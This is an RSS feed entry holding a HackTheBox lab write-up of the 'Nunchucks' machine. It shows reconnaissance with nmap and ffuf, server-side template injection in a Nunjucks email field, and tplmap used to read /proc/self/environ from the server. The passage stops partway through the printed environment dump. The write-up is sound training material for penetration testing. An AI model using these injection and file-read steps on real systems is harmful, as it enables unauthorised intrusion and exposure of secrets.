<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Ef&#39;s log</title>
    <link>https://fahmifj.github.io/</link>
    <description>Recent content on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 07 Nov 2021 01:42:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Nunchuks</title>
      <link>https://fahmifj.github.io/hackthebox/nunchuks/</link>
      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/nunchuks/</guid>
      <description>SSTI in Nunjucks and SUID capability on Perl</description>
      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SSTI on Nunjucks</li>
<li>Creating tplmap middleware using Flask</li>
<li>Exploiting <code>cap_setuid</code> on Perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Tplmap</li>
<li>Flask</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ fscan 10.10.11.122 nunchucks
nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
Nmap scan report <span class="k">for</span> 10.10.11.122
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Nunchucks - Landing Page
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
<span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
<span class="p">|</span> Not valid before: 2021-08-30T15:42:24
<span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
<span class="p">|</span> tls-nextprotoneg: 
<span class="p">|</span>_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="http---https">HTTP -&gt; HTTPS</h3>
<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ curl -I http://nunchucks.htb/ 
HTTP/1.1 <span class="m">301</span> Moved Permanently
Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
Content-Type: text/html
Content-Length: <span class="m">178</span>
Connection: keep-alive
Location: https://nunchucks.htb/
</code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
</p>
<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
</p>
<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
</p>
<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
</p>
<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
</p>
<p>But then, the returned response states that registration is closed</p>
<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
</p>
<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
</p>
<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
</p>
<p>Nothing else to try here.</p>
<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>

        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nunchucks.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.nunchucks.htb
 :: Follow redirects : <span class="nb">false</span>
 :: Calibration      : <span class="nb">false</span>
 :: Timeout          : <span class="m">10</span>
 :: Threads          : <span class="m">40</span>
 :: Matcher          : Response status: <span class="m">200</span>
 :: Filter           : Response lines: <span class="m">547</span>
________________________________________________

store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
<p>Store is not available, but I can subscribe for newsletter.</p>
<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
</p>
<p>When I submit an email address there, it reflects the address back.</p>
<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="ssti">SSTI</h3>
<h4 id="identify">Identify</h4>
<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
</p>
<blockquote>
<p>The email validation is on client-side.</p>
</blockquote>
<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.htb</code>. Here&rsquo;s the code:</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>

<blockquote>
<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
</blockquote>
<p>I&rsquo;ll run the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.46»
$ python3 middleware.py
 * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
</code></pre></div><p>Then I will point <code>tplmap</code> to the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
</p>
<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:

  GET parameter: email
  Engine: Nunjucks
  Injection: <span class="o">{{</span>*<span class="o">}}</span>
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell <span class="nb">command</span> execution: no
   Bind and reverse shell: no
   File write: ok
   File read: ok
   Code evaluation: ok, javascript code

<span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:

    --upload LOCAL REMOTE       Upload files to the server
    --download REMOTE LOCAL     Download remote files
</code></pre></div><p>Based on the <code>tplmap</code> results, it seems that command execution is not possible.</p>
<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:

  GET parameter: email
  Engine: Nunjucks
  Injection: <span class="o">{{</span>*<span class="o">}}</span>
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell <span class="nb">command</span> execution: no
   Bind and reverse shell: no
   File write: ok
   File read: ok
   Code evaluation: ok, javascript code

<span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
</code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
<span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
<span class="s2">&#34;windowsHide&#34;</span>:true
<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
<span class="s2">&#34;treekill&#34;</span>:true
<span class="s2">&#34;automation&#34;</span>:true
<span class="s2">&#34;pmx&#34;</span>:true
<span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
<span class="s2">&#34;watch&#34;</span>:false
<span class="s2">&#34;autorestart&#34;</span>:true
<span class="s2">&#34;vizion&#34;</span>:true
<span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
<span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
<span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
<span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
<span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
<span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
<span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
<span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
<span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
<span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
<span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
<span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
<span class="s2">&#34;km_link&#34;</span>:false
<span class="s2">&#34;vizion_running&#34;</span>:false
<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
<span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
